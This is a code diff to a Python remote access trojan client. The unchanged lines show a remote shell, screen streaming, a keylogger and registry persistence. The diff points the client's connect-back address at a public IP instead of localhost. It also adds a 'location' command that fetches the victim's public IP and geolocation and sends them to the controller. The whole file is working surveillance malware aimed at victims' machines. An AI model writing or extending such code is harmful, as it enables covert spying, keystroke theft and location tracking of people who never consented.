@@ -9,9 +9,11 @@ import shutil
 import sys
 import time
 from vidstream import ScreenShareClient
+from requests import get
+import urllib
 
 # Connection data
-HOST = '127.0.0.1'
+HOST = '188.251.33.6'
 PORT = 5555
 STREAMING_PORT = 9999
 streamFlag = 0
@@ -92,6 +94,11 @@ def screenShare():
 
     sender.stop_stream()
 
+def sendMyLocation():
+    ip = get('https://api.ipify.org').text
+    response = urllib.urlopen("http://api.hostip.info/get_html.php?ip={}&position=true".format(ip)).read()
+    send(response)
+
 def shell():
 
     global streamFlag
@@ -140,6 +147,9 @@ def shell():
             keylog.deleteFile()
             t.join()
             send(f'''[+] The keylogger session at [{socket.gethostname()}] was ended by the host. Dump Files deleted''')
+
+        elif command.startswith('location'):
+            sendMyLocation()
 
         elif command.startswith('persistence'):
             regName, copyName = command[12:].split(' ')
